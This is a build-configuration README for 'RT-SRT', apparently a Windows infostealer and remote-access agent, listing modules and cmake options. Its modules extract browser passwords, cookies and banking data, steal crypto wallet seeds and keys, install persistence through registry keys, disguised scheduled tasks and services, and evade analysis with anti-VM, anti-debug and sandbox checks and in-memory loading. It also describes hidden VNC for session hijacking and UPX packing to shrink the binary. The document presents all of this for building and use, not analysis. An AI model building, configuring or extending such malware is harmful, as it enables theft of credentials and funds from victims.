# RT-SRT Build Modules Configuration

## Available Modules

### Core Modules (Always Enabled)
- **main.cpp** - Main agent entry point and coordination
- **file_logger.cpp** - Basic file logging system  
- **encrypt_logger.cpp** - Encrypted logging with AES

### Optional Modules (Configurable)

#### 🌐 Browser Module (`ENABLE_BROWSER_MODULE=ON`)
- **chrome.cpp** - Chrome/Chromium browser data extraction
- **firefox.cpp** - Firefox browser data extraction  
- **edge.cpp** - Microsoft Edge data extraction
- **wallets.cpp** - Browser-based crypto wallet detection
- **sqlite_minimal.cpp** - SQLite database parsing

**Extracted Data:**
- Passwords, cookies, autofill data
- Browsing history and bookmarks
- Crypto wallet extensions (MetaMask, Trust, etc.)
- Banking and financial site data

#### 💰 Crypto Module (`ENABLE_CRYPTO_MODULE=ON`)
- **metamask.cpp** - MetaMask wallet extraction
- **phantom.cpp** - Phantom (Solana) wallet extraction
- **exodus.cpp** - Exodus wallet extraction
- **trust.cpp** - Trust Wallet extraction

**Extracted Data:**
- Wallet vault data and encrypted keys
- Mnemonic phrases and seed data
- Account addresses and balances
- Transaction history

#### 🔒 Persistence Module (`ENABLE_PERSISTENCE_MODULE=ON`)
- **advanced_persistence.cpp** - Advanced persistence mechanisms
- **task_scheduler.cpp** - Windows Task Scheduler integration
- **registry.cpp** - Registry-based persistence

**Features:**
- AES-256 encrypted persistence data
- Multiple fallback installation paths
- Scheduled tasks with legitimate names
- Registry Run keys (HKCU/HKLM)
- COM object persistence
- Startup folder links
- Service installation (admin)
- Watchdog process management

#### 🛡️ Stealth Module (`ENABLE_STEALTH_MODULE=ON`)
- **anti_vm.cpp** - Virtual machine detection
- **anti_debug.cpp** - Debugger detection and prevention
- **in_memory_loader.cpp** - In-memory code execution

**Anti-Analysis Features:**
- VM detection (VMware, VirtualBox, Hyper-V)
- Debugger detection (WinDbg, x64dbg, OllyDbg)
- Sandbox environment detection
- Analysis tool detection
- Timing-based anomaly detection
- CPUID and hardware fingerprinting

#### 🖥️ HVNC Module (`ENABLE_HVNC_MODULE=ON`)
- **create_desktop.cpp** - Hidden desktop creation
- **control_session.cpp** - Remote desktop control

**Hidden VNC Features:**
- Invisible desktop creation
- Remote screen capture and control
- Input injection and monitoring
- Session hijacking capabilities

## Build Configuration

### Default Configuration
```cmake
option(ENABLE_BROWSER_MODULE "Enable browser data extraction" ON)
option(ENABLE_CRYPTO_MODULE "Enable crypto wallet extraction" ON) 
option(ENABLE_PERSISTENCE_MODULE "Enable persistence mechanisms" ON)
option(ENABLE_STEALTH_MODULE "Enable anti-analysis features" ON)
option(ENABLE_HVNC_MODULE "Enable Hidden VNC" ON)
option(ENABLE_ADVANCED_LOGGING "Enable advanced encrypted logging" ON)
```

### Custom Build Examples

#### Minimal Build (Stealth + Persistence Only)
```bash
cmake -DENABLE_BROWSER_MODULE=OFF \
      -DENABLE_CRYPTO_MODULE=OFF \
      -DENABLE_HVNC_MODULE=OFF \
      ..
```

#### Data Extraction Build (No Persistence)
```bash  
cmake -DENABLE_PERSISTENCE_MODULE=OFF \
      -DENABLE_HVNC_MODULE=OFF \
      ..
```

#### Maximum Stealth Build
```bash
cmake -DCMAKE_BUILD_TYPE=Release \
      -DENABLE_STEALTH_MODULE=ON \
      -DENABLE_ADVANCED_LOGGING=OFF \
      ..
```

## Build Targets

### Standard Targets
- `rt_srt_agent` - Main agent build (DLL by default)
- `build_report` - Comprehensive build information
- `pack_agent` - UPX compression (if available)
- `pack_aggressive` - Maximum UPX compression

### Development Targets
- `quick_build` - Fast debug build
- `release_build` - Optimized release build  
- `clean_build` - Complete rebuild
- `module_test` - Module functionality tests

## Size Optimization

### Enabled by Default
- Function-level linking (`/Gy`)
- String pooling (`/GF`) 
- Dead code elimination
- Whole program optimization (Release)
- Debug symbol stripping

### Post-Build Compression
- UPX packing available
- Typical size reduction: 60-80%
- `pack_agent` - Standard compression
- `pack_aggressive` - Maximum compression (slower)

## Windows Libraries Linked

### Core Libraries
- kernel32, user32, shell32, advapi32, ntdll

### Cryptography  
- crypt32, bcrypt

### Networking
- ws2_32, wininet, winhttp, iphlpapi

### COM/Task Scheduler
- ole32, oleaut32, uuid, comsupp, taskschd

### WMI/Debug
- wbemuuid, psapi, dbghelp

### Security
- secur32, netapi32

## Compile Definitions

### Always Defined
- `WIN32_LEAN_AND_MEAN`
- `_WIN32_WINNT=0x0601` (Windows 7+)
- `UNICODE`, `_UNICODE`
- `NOMINMAX`

### Module-Specific
- `MODULE_BROWSER_ENABLED`
- `MODULE_CRYPTO_ENABLED`  
- `MODULE_PERSISTENCE_ENABLED`
- `MODULE_STEALTH_ENABLED`
- `MODULE_HVNC_ENABLED`
- `ADVANCED_LOGGING_ENABLED`